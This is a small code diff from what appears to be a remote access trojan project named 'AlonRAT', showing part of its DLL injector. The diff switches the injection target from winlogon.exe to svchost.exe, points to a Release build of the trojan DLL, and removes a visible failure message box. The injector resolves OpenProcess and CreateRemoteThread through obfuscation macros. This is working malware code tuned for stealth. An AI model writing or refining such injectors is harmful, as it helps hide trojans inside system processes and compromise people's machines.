@@ -4,8 +4,8 @@
 #include "utils.h"
 #include <iostream>
 
-#define DLL_PATH OBFUSCATE("C:\\Users\\alonp\\source\\repos\\AlonRAT\\x64\\Debug\\AlonRAT.dll")
-#define PROCESS_NAME OBFUSCATE("winlogon.exe")
+#define DLL_PATH OBFUSCATE("C:\\Users\\alonp\\source\\repos\\AlonRAT\\x64\\Release\\AlonRAT.dll")
+#define PROCESS_NAME OBFUSCATE("svchost.exe")
 
 bool inject(DWORD pid, const char* dll_store_path)
 {
@@ -17,12 +17,6 @@ bool inject(DWORD pid, const char* dll_store_path)
     create_remote_thread_type create_remote_thread = WINAPI_OBFUSCATE(create_remote_thread_type, "CreateRemoteThread", "kernel32");
     HANDLE hProcess = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32")(PROCESS_ALL_ACCESS, FALSE, pid);
     if (hProcess == NULL) {
-        MessageBoxA(
-            nullptr,
-            "fail",
-            "fail",
-            0
-        );
         return false;
     }
 
